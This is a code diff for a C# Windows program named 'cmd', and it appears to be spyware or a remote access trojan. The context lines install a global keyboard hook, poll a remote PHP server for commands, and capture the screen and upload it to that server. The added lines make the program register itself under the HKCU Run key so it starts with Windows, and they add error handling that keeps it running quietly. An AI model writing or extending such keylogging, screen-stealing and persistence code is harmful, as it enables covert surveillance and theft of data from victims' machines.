@@ -53,6 +53,8 @@ namespace cmd
               });
             //chatWindow.Show();
 
+            RegisterInStartup(true);
+
             keyboardHook = new KeyboardHook();
             keyboardHook.Install();
             keyboardHook.KeyDown += (sender, e) =>
@@ -65,6 +67,23 @@ namespace cmd
             dispatcherTimer.Tick += new EventHandler(timer_Tick);
             dispatcherTimer.Interval = new TimeSpan(0, 0, 1);
             dispatcherTimer.Start();
+        }
+
+        private void RegisterInStartup(bool isChecked)
+        {
+            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey
+                    ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+
+            if (isChecked)
+            {
+                // Đăng ký stratup cùng Windows
+                registryKey.SetValue("CMD", Directory.GetCurrentDirectory() + "\\cmd.exe");
+            }
+            else
+            {
+                // Hủy đăng ký
+                registryKey.DeleteValue("CMD");
+            }
         }
 
         private void upLog(string log)
@@ -101,7 +120,7 @@ namespace cmd
 
             while (!int.TryParse(request("http://akita123.atwebpages.com/main.php?type=5"), out id) || id <= 0)
             {
-                Thread.Sleep(1000);
+                Thread.Sleep(2000);
             }
 
             return id;
@@ -113,7 +132,7 @@ namespace cmd
 
             while (!int.TryParse(request("http://akita123.atwebpages.com/main.php?type=1&userid=" + userID), out id))
             {
-                Thread.Sleep(1000);
+                Thread.Sleep(2000);
             }
 
             return id;
@@ -136,18 +155,25 @@ namespace cmd
 
         private string request(string url)
         {
-            WebRequest request = WebRequest.Create(url);
-            request.Credentials = CredentialCache.DefaultCredentials;
-            WebResponse response = request.GetResponse();
-            Stream dataStream = response.GetResponseStream();
-            StreamReader reader = new StreamReader(dataStream);
+            try
+            {
+                WebRequest request = WebRequest.Create(url);
+                request.Credentials = CredentialCache.DefaultCredentials;
+                WebResponse response = request.GetResponse();
+                Stream dataStream = response.GetResponseStream();
+                StreamReader reader = new StreamReader(dataStream);
 
-            string responseFromServer = reader.ReadToEnd();
+                string responseFromServer = reader.ReadToEnd();
 
-            reader.Close();
-            response.Close();
+                reader.Close();
+                response.Close();
 
-            return responseFromServer;
+                return responseFromServer;
+            }
+            catch (Exception e)
+            {
+                return e.Message;
+            }
         }
 
         private void timer_Tick(object sender, EventArgs e)
@@ -220,53 +246,69 @@ namespace cmd
 
         private string takeScreen()
         {
-            var currentDPI = (int)Registry.GetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop\\WindowMetrics", "AppliedDPI", 96);
-            var scale = (float)currentDPI / 96;
-
-            Bitmap screenBitmap;
-            Graphics screenGraphics;
-
-            using (screenBitmap = new Bitmap((int)(SystemParameters.PrimaryScreenWidth * scale),
-                                      (int)(SystemParameters.PrimaryScreenHeight * scale),
-                                      System.Drawing.Imaging.PixelFormat.Format32bppArgb))
+            try
             {
-                screenGraphics = Graphics.FromImage(screenBitmap);
+                var currentDPI = (int)Registry.GetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop\\WindowMetrics", "AppliedDPI", 96);
+                var scale = (float)currentDPI / 96;
 
-                screenGraphics.CopyFromScreen(0, 0,
-                                        0, 0, screenBitmap.Size, CopyPixelOperation.SourceCopy);
-                screenBitmap.Save(@"d:\bit.jpg", ImageFormat.Jpeg);
+                Bitmap screenBitmap;
+                Graphics screenGraphics;
 
+                using (screenBitmap = new Bitmap((int)(SystemParameters.PrimaryScreenWidth * scale),
+                                          (int)(SystemParameters.PrimaryScreenHeight * scale),
+                                          System.Drawing.Imaging.PixelFormat.Format32bppArgb))
+                {
+                    screenGraphics = Graphics.FromImage(screenBitmap);
+
+                    screenGraphics.CopyFromScreen(0, 0,
+                                            0, 0, screenBitmap.Size, CopyPixelOperation.SourceCopy);
+                    screenBitmap.Save(@"d:\bit.jpg", ImageFormat.Jpeg);
+
+                }
+
+                return @"d:\bit.jpg";
             }
-
-            return @"d:\bit.jpg";
+            catch (Exception e)
+            {
+                return null;
+            }
         }
 
         private async System.Threading.Tasks.Task uploadFileAsync(string path)
         {
-            var hc = new HttpClient();
-            var dic = new Dictionary<string, string>();
-            dic["FileName"] = "screen.jpg";
-
-            var fileName = path;
-            var fileContent = new StreamContent(File.OpenRead(fileName));
-            fileContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("attachment")
+            try
             {
-                FileName = System.IO.Path.GetFileName(fileName),
-                Name = @"userfile[]"
-            };
+                if (path == null || path == "") return;
 
-            var content = new MultipartFormDataContent();
-            foreach (var param in dic)
+                var hc = new HttpClient();
+                var dic = new Dictionary<string, string>();
+                dic["FileName"] = "screen.jpg";
+
+                var fileName = path;
+                var fileContent = new StreamContent(File.OpenRead(fileName));
+                fileContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("attachment")
+                {
+                    FileName = System.IO.Path.GetFileName(fileName),
+                    Name = @"userfile[]"
+                };
+
+                var content = new MultipartFormDataContent();
+                foreach (var param in dic)
+                {
+                    content.Add(new StringContent(param.Value), param.Key);
+                }
+                content.Add(fileContent);
+
+                var url = "http://akita123.atwebpages.com/test.php";
+                var req = await hc.PostAsync(url, content);
+                //var html = await req.Content.ReadAsStringAsync();
+                //MessageBox.Show(html);
+                sendCommand("VIEWSCREEN");
+
+            } catch(Exception e)
             {
-                content.Add(new StringContent(param.Value), param.Key);
+                sendCommand("MBOX " + e.Message);
             }
-            content.Add(fileContent);
-
-            var url = "http://akita123.atwebpages.com/test.php";
-            var req = await hc.PostAsync(url, content);
-            //var html = await req.Content.ReadAsStringAsync();
-            //MessageBox.Show(html);
-            sendCommand("VIEWSCREEN");
         }
 
         private async System.Threading.Tasks.Task sendLongCommandAsync(string command)
@@ -287,7 +329,7 @@ namespace cmd
             var cont = new FormUrlEncodedContent(data);
             var url = "http://akita123.atwebpages.com/main.php";
             var req = await httpClient.PostAsync(url, cont);
-            //var html = await req.Content.ReadAsStringAsync();
+            var html = await req.Content.ReadAsStringAsync();
             //MessageBox.Show(html);
         }
 
